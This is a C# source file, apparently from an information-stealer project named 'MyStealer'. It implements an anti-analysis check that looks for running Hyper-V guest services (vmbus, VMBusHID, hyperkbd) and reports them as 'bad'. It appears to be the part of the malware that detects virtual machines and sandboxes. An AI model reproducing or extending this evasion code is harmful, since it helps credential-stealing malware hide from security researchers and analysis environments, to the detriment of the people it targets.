using System.ServiceProcess;

namespace MyStealer.AntiDebug.Check
{
    internal class Services : CheckBase
    {
        public override string Name => "Services";

        private readonly string[] serviceNames = new string[]
        {
            "vmbus",
            "VMBusHID",
            "hyperkbd"
        };

        public override bool CheckPassive()
        {
            foreach (var service in ServiceController.GetServices())
            {
                if (service.Status == ServiceControllerStatus.Stopped)
                    continue;

                foreach (var name in serviceNames)
                {
                    if (service.ServiceName.Contains(name))
                    {
                        Logger.Information("Bad service {name} is running.", name);
                        return true;
                    }
                }
            }

            return false;
        }
    }
}
